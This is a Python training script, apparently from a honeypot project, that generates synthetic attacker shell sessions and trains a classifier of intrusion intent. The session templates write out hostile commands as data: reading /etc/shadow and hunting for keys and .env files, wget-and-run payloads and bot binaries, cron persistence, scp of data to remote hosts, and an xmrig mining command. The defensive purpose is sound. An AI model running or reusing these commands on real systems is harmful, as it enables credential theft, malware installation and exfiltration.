"""
train_classifier.py — Generates synthetic training data and trains the classifier.

Run once to produce model artifacts in data/models/.
Can also be run with --from-db to train on real captured Cowrie sessions.

Usage:
    python -m src.behavior.train_classifier
    python -m src.behavior.train_classifier --from-db
"""

from __future__ import annotations
import argparse
import logging
import random
import os

from .classifier import AttackerClassifier, INTENT_LABELS

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("neurotrap.train")

# ── Synthetic session factory ─────────────────────────────────────────────────

def _make_session(intent: str) -> dict:
    templates: dict[str, dict] = {
        "reconnaissance": {
            "commands": random.sample(
                ["whoami", "id", "uname -a", "hostname", "ifconfig", "ip addr", "ps aux",
                 "ls -la", "pwd", "env", "printenv", "cat /etc/os-release", "df -h", "free -m"],
                k=random.randint(3, 8),
            ),
            "duration_secs": random.uniform(10, 120),
            "login_attempts": random.randint(1, 5),
            "failed_logins": random.randint(0, 2),
        },
        "credential_harvesting": {
            "commands": ["cat /etc/shadow", "cat /etc/passwd", "cat /etc/sudoers",
                         "find / -name '*.pem'", "find / -name '.env'"] + random.sample(
                ["whoami", "id", "history"], k=2),
            "duration_secs": random.uniform(30, 300),
            "login_attempts": random.randint(50, 500),
            "failed_logins": random.randint(45, 495),
        },
        "malware_deployment": {
            "commands": [
                f"wget http://{_rnd_ip()}/{''.join(random.choices('abcdefghij', k=5))}.sh",
                "chmod +x payload.sh", "bash payload.sh",
                "crontab -e", "nohup ./payload &",
            ] + random.sample(["whoami", "uname -a"], k=random.randint(0, 2)),
            "duration_secs": random.uniform(60, 600),
            "login_attempts": random.randint(1, 10),
            "failed_logins": random.randint(0, 3),
        },
        "lateral_movement": {
            "commands": [
                f"ssh {_rnd_user()}@{_rnd_ip()}",
                f"scp -r /data {_rnd_user()}@{_rnd_ip()}:/tmp",
                "cat /etc/hosts", "arp -a", "netstat -an",
            ] + random.sample(["whoami", "ifconfig"], k=2),
            "duration_secs": random.uniform(120, 900),
            "login_attempts": random.randint(1, 5),
            "failed_logins": 0,
        },
        "cryptomining": {
            "commands": [
                f"wget http://{_rnd_ip()}/xmrig",
                "chmod +x xmrig",
                f"./xmrig --cpu-max-threads-hint 90 -o pool.minexmr.com:443 -u {_rnd_wallet()} --tls",
                "crontab -e",
            ],
            "duration_secs": random.uniform(30, 120),
            "login_attempts": random.randint(1, 20),
            "failed_logins": random.randint(0, 5),
        },
        "bot_enrollment": {
            "commands": [
                f"wget http://{_rnd_ip()}/bot.elf",
                "chmod 777 bot.elf", "./bot.elf",
                f"echo '*/5 * * * * /tmp/bot.elf' | crontab -",
            ] + random.sample(["whoami", "uname -m"], k=1),
            "duration_secs": random.uniform(20, 180),
            "login_attempts": random.randint(10, 100),
            "failed_logins": random.randint(5, 90),
        },
    }
    return templates.get(intent, templates["reconnaissance"])


def _rnd_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def _rnd_user():
    return random.choice(["admin", "root", "deploy", "ubuntu", "user"])

def _rnd_wallet():
    import string
    return "4" + "".join(random.choices(string.hexdigits, k=93))


def generate_synthetic_dataset(n_per_class: int = 150) -> tuple[list[dict], list[str]]:
    sessions, labels = [], []
    for intent in INTENT_LABELS:
        for _ in range(n_per_class):
            sessions.append(_make_session(intent))
            labels.append(intent)
    return sessions, labels


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--from-db", action="store_true")
    parser.add_argument("--n-per-class", type=int, default=200)
    args = parser.parse_args()

    clf = AttackerClassifier()

    if args.from_db:
        from pymongo import MongoClient
        client = MongoClient(os.getenv("MONGO_URI", "mongodb://localhost:27017/neurotrap"))
        db = client["neurotrap"]
        labeled = list(db["labeled_sessions"].find({}, {"_id": 0}))
        if not labeled:
            logger.warning("No labeled sessions in DB — falling back to synthetic data")
            sessions, labels = generate_synthetic_dataset(args.n_per_class)
        else:
            sessions = labeled
            labels = [s.pop("label") for s in sessions]
    else:
        logger.info("Generating %d synthetic sessions per class…", args.n_per_class)
        sessions, labels = generate_synthetic_dataset(args.n_per_class)

    f1 = clf.train(sessions, labels)
    if f1 >= 0.85:
        clf.save()
        logger.info("Model saved — F1=%.3f meets target", f1)
    else:
        logger.warning("F1=%.3f below target 0.85 — consider more data or tuning", f1)
        clf.save()  # save anyway for iteration


if __name__ == "__main__":
    main()
